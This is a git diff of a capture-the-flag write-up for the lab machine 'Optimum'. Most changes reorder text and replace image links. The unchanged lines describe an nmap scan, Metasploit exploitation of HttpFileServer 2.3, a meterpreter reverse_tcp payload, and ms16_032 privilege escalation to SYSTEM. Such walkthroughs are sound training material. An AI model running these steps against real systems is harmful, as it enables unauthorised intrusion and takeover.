@@ -14,9 +14,10 @@ sudo nmap -Pn -A -T4 IP -oA initial.IP
 From our scan we can see that we only have port 80 open on this machine that seems to just be a web server. The next logical step would be to navigate to the site just to see what we can find.
 
 ## Port 80 - HttpFileServer 2.3
-<p align="center"> <img src="Screenshots/HTTP File Server.png" width="850"> </p>Upon navigating to the server IP we discover this web page and after clicking around and seeing the application functionality I clicked into the HttpFileServer 2.3 link to discover the servers admin panel (rejetto.hfs)
-
 <p align="center"> <img src="Screenshots/admin panel.png" width="850"> </p>
+Upon navigating to the server IP we discover this web page and after clicking around and seeing the application functionality I clicked into the HttpFileServer 2.3 link to discover the servers admin panel (rejetto.hfs)
+
+<p align="center"> <img src="Screenshots/HTTPFileServer.png" width="850"> </p>
 
 # Exploitation
 Remembering back to the description of the box I opened up a msfconsole session.
@@ -54,7 +55,7 @@ sysinfo
 getuid
 ```
 
-<p align="center"> <img src="Screenshots/meterpreter sysinfo.png" width="850"> </p>
+<p align="center"> <img src="Screenshots/meterpreterSysinfo.png" width="850"> </p>
 
 I found that the machine is Windows Server 2012 and we are the user OPTIMUM\kostas. The next thing I wanted to do real quick was check for the user.txt flag.
 
@@ -83,7 +84,7 @@ set sessions SESSID
 run
 ```
 
-![[Pasted image 20260105174009.png]]
+<p align="center"> <img src="Screenshots/local_exploit_suggester.png" width="850"> </p>
 
 After a successful scan I found a couple of promising options. The one that stuck out the most was the ms16_032 because I'm wanting to achieve privesc.
 
@@ -97,7 +98,7 @@ set payload windows/x64/meterpreter/reverse_tcp
 run
 ```
 
-![[Pasted image 20260105180737.png]]
+<p align="center"> <img src="Screenshots/ms16_privesc.png" width="850"> </p>
 
 Sick the module worked as I had hoped! I ran a quick "getuid" to double check who I was and we were indeed SYSTEM. All that was left at this point was to navigate to the Admin Desktop space and grab the root.txt flag!
 
@@ -108,5 +109,5 @@ dir
 type root.txt
 ```
 
-![[Pasted image 20260105181414.png]]
-Optimum completed. Happy Hacking! :)
+<p align="center"> <img src="Screenshots/root.png" width="850"> </p>
+Optimum owned!! Happy Hacking! :)
